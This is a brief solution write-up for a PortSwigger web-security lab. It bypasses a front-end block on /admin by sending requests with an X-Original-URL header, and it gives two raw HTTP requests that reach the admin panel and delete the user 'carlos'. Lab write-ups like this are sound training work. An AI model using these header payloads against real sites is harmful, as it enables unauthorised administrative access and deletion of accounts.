
# URL-based access control can be circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos.

---------------------------------------------

References: 

- https://portswigger.net/web-security/access-control



![img](images/URL-based%20access%20control%20can%20be%20circumvented/1.png)

---------------------------------------------

Accessing directly /admin returns a 403 error code:



![img](images/URL-based%20access%20control%20can%20be%20circumvented/2.png)


It is possible to access /admin with:

```
GET / HTTP/2
...
X-Original-Url: /admin/
```



![img](images/URL-based%20access%20control%20can%20be%20circumvented/3.png)


And the we can delete the user with this payload. The parameter “username" must be in the URL:

```
GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete
```



![img](images/URL-based%20access%20control%20can%20be%20circumvented/4.png)